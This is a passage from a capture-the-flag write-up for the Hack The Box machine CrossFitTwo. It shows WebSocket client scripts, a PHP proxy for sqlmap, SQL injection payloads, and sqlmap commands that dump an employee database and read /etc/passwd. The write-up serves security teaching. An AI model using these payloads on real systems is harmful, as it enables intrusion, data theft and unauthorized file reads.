@@ -1,0 +1,713 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - CrossFitTwo" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/crossFitTwo/" /><meta property="og:url" content="https://x00tex.github.io/posts/crossFitTwo/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/crossFitTwo/crossfittwo_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-20T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/crossFitTwo/crossfittwo_banner.png" /><meta property="twitter:title" content="Hackthebox - CrossFitTwo" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-16T12:39:32+00:00","datePublished":"2021-08-20T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - CrossFitTwo","image":"https://x00tex.github.io/assets/img/posts/crossFitTwo/crossfittwo_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/crossFitTwo/"},"url":"https://x00tex.github.io/posts/crossFitTwo/"}</script><title>Hackthebox - CrossFitTwo | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - CrossFitTwo</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - CrossFitTwo</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1629484200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-08-20 </em> </span> <span> Updated <em class="timeago" data-ts="1652704772" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3612 words"> <em>20 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/crossFitTwo/crossfittwo_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.10.232 crossfit.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>PORT     STATE SERVICE             VERSION
+22/tcp   open  ssh                 OpenSSH 8.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http                <span class="o">(</span>PHP 7.4.12<span class="o">)</span>
+|_http-server-header: OpenBSD httpd
+|_http-title: CrossFit
+8953/tcp open  ssl/ub-dns-control?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>unbound
+| Not valid before: 2021-01-11T07:01:10
+|_Not valid after:  2040-09-28T07:01:10
+</pre></table></code></div></div><ul><li><strong>OS:</strong> OpenBSD<li>Port 8953 is running Unbound dns server.<ul><li><strong><a href="https://www.nlnetlabs.nl/projects/unbound/about/">Unbound</a></strong> is a validating, recursive, caching DNS resolver.</ul></ul><p>Found 2 subdomains from burpsuite spider</p><p><img data-src="/assets/img/posts/crossFitTwo/sub-domains.png" alt="" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>gym.crossfit.htb
+employees.crossfit.htb
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">employees.crossfit.htb</code> contains a login page.</p><p><img data-src="/assets/img/posts/crossFitTwo/employ-login.png" alt="" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">gym.crossfit.htb</code> have WebSocket API used for chat feature.</p><p><img data-src="/assets/img/posts/crossFitTwo/ws-chat.png" alt="" data-proofer-ignore></p><h1 id="foothold">Foothold</h1><h2 id="websocket"><span class="mr-2">Websocket</span><a href="#websocket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><strong>WebSocket API</strong> is an advanced technology that makes it possible to open a two-way interactive communication session between the user’s browser and a server.</ul><p>There are three commands. When we use third command <code class="language-plaintext highlighter-rouge">memberships</code> to check memberships and click on any membership</p><p><img data-src="/assets/img/posts/crossFitTwo/memberships-check.png" alt="" data-proofer-ignore></p><p>it send a request with a extra parameter: <code class="language-plaintext highlighter-rouge">"params":"1"</code></p><p><img data-src="/assets/img/posts/crossFitTwo/membership-check.gif" alt="" data-proofer-ignore></p><p>And another thing is that every request uses a unique token, when client first time connect to the server, server send a token that uses in the client’s next request and this token changes every time when server response to a client.</p><h3 id="websocket-client-python-script"><span class="mr-2">Websocket client python script</span><a href="#websocket-client-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">websockets</span>
+<span class="kn">import</span> <span class="nn">asyncio</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"ws://gym.crossfit.htb/ws/"</span>
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-m'</span><span class="p">,</span> <span class="s">'--message'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Send command'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--params'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Test "params" parameter'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">async</span> <span class="k">def</span> <span class="nf">lets_talk</span><span class="p">():</span>
+    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">message</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"available"</span><span class="p">,</span> <span class="s">"params"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"&lt; </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"&gt; </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">parser</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">asyncio</span><span class="p">.</span><span class="n">get_event_loop</span><span class="p">().</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">lets_talk</span><span class="p">())</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">' KeyboardInterrupt'</span><span class="p">)</span>
+</pre></table></code></div></div><p>While testing <code class="language-plaintext highlighter-rouge">params</code> parameter found sql injections.</p><p><strong>Boolean based Blind SQL Injection</strong></p><p><img data-src="/assets/img/posts/crossFitTwo/boolen-blind-sqli.png" alt="" data-proofer-ignore></p><p><strong>SQL UNION injection</strong></p><p><img data-src="/assets/img/posts/crossFitTwo/UNION-sqli.png" alt="" data-proofer-ignore></p><h2 id="sql-injection"><span class="mr-2">SQL injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="websocket-client-mitm-server"><span class="mr-2">websocket client mitm server</span><a href="#websocket-client-mitm-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Creating a php server based websocket client so we can automate sql injection with sqlmap.</p><ul><li>There is a library <strong><a href="https://github.com/Textalk/websocket-php"><code class="language-plaintext highlighter-rouge">textalk/websocket</code></a></strong>, We can use for websocket in php.</ul><p>Install it in project folder</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">composer</span> <span class="k">require</span> <span class="n">textalk</span><span class="o">/</span><span class="n">websocket</span>
+</pre></table></code></div></div><p>Create php script</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+
+<span class="kn">use</span> <span class="nc">WebSocket\Client</span><span class="p">;</span>
+
+<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WebSocket\Client</span><span class="p">(</span><span class="s2">"ws://gym.crossfit.htb/ws/"</span><span class="p">);</span>
+<span class="nv">$recv_token</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">receive</span><span class="p">();</span>
+<span class="nv">$token</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$recv_token</span><span class="p">,</span> <span class="kc">true</span><span class="p">)[</span><span class="s2">"token"</span><span class="p">];</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'available'</span><span class="p">,</span> <span class="s1">'params'</span> <span class="o">=&gt;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">],</span> <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="nv">$token</span><span class="p">));</span>
+<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">send</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">receive</span><span class="p">();</span>
+<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
+
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/websocket-client-server.png" alt="" data-proofer-ignore></p><h3 id="boolean-based-blind-sql-injection"><span class="mr-2">Boolean based Blind SQL Injection</span><a href="#boolean-based-blind-sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Found injection with payload: <code class="language-plaintext highlighter-rouge">1 AND 1=1</code></ul><p>And now we can use sqlmap to automate sql injection.</p><p>Some sqlmap flags to make scan more accurate based on known information.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nt">--technique</span><span class="o">=</span>TECH..  SQL injection techniques to use <span class="o">(</span>default <span class="s2">"BEUSTQ"</span><span class="o">)</span>
+<span class="nt">--string</span><span class="o">=</span>STRING     String to match when query is evaluated to True
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="c">#retrieving database names</span>
+sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.15.71:8000/websocket-client.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--string</span><span class="o">=</span><span class="s1">'Good news!'</span> <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span>
+
+available databases <span class="o">[</span>3]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> crossfit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> employees
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+
+<span class="c">#retrieving tables</span>
+sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.15.71:8000/websocket-client.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--string</span><span class="o">=</span><span class="s1">'Good news!'</span> <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> employees <span class="nt">--tables</span>
+
+Database: employees
+<span class="o">[</span>2 tables]
++----------------+
+| employees      |
+| password_reset |
++----------------+
+
+<span class="c">#dump data</span>
+sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.15.71:8000/websocket-client.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--string</span><span class="o">=</span><span class="s1">'Good news!'</span> <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> employees <span class="nt">-T</span> employees <span class="nt">--dump</span>
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/employe-creds.png" alt="" data-proofer-ignore></p><p><strong>These password hashes are not crackable</strong></p><p>Check if database user have any privileges</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>database management system <span class="nb">users </span>privileges:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> %crossfit_user% <span class="o">[</span>1]:
+    privilege: FILE
+</pre></table></code></div></div><ul><li><p>From mysql docs “A user who has the <strong>FILE privilege</strong> can read any file on the server host that is either world-readable or readable by the MySQL server.”</p><li><p>sql payload for boolean based blind injection for checking if file exist: <strong><code class="language-plaintext highlighter-rouge">1 AND !isnull(load_file(0x&lt;filepath_in_hexadecimal&gt;))</code></strong></p></ul><p>Check <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ python websocket.py <span class="nt">-p</span> <span class="s1">'1 AND 1 AND !isnull(load_file(0x2f6574632f706173737764))'</span>
+&lt; <span class="o">{</span><span class="s2">"message"</span>: <span class="s2">"available"</span>, <span class="s2">"params"</span>: <span class="s2">"1 AND 1 AND !isnull(load_file(0x2f6574632f706173737764))"</span>, <span class="s2">"token"</span>: <span class="s2">"97c47b19d8c2fc7f2ea9cfe79078fb2279478e15c4fb2ede301b8ad4c3d08e46"</span><span class="o">}</span>
+<span class="o">&gt;</span> <span class="o">{</span><span class="s2">"status"</span>:<span class="s2">"200"</span>,<span class="s2">"message"</span>:<span class="s2">"Good news! This membership plan is available."</span>,<span class="s2">"token"</span>:<span class="s2">"645e596d99d2d03b82588868b437831c89f13bda4c168b318ed59b6d5f00a7b6"</span>,<span class="s2">"debug"</span>:<span class="s2">"[id: 1, name: 1-month]"</span><span class="o">}</span>
+</pre></table></code></div></div><p>Read file with sqlmap</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.15.71:8000/websocket-client.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--string</span><span class="o">=</span><span class="s1">'Good news!'</span> <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--file-read</span><span class="o">=</span><span class="s2">"/etc/passwd"</span>
+</pre></table></code></div></div><h3 id="union-sql-injection-to-read-file"><span class="mr-2">UNION sql injection to Read file</span><a href="#union-sql-injection-to-read-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Found injection with payload: <code class="language-plaintext highlighter-rouge">3 UNION SELECT 1,2</code></ul><p>This is more faster than blind injection because values are reflated in the response.</p><p><strong>Updated Websocket client python script</strong></p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">websockets</span>
+<span class="kn">import</span> <span class="nn">asyncio</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"ws://gym.crossfit.htb/ws/"</span>
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-m'</span><span class="p">,</span> <span class="s">'--message'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Send command'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--params'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'"params" parameter value'</span><span class="p">)</span>
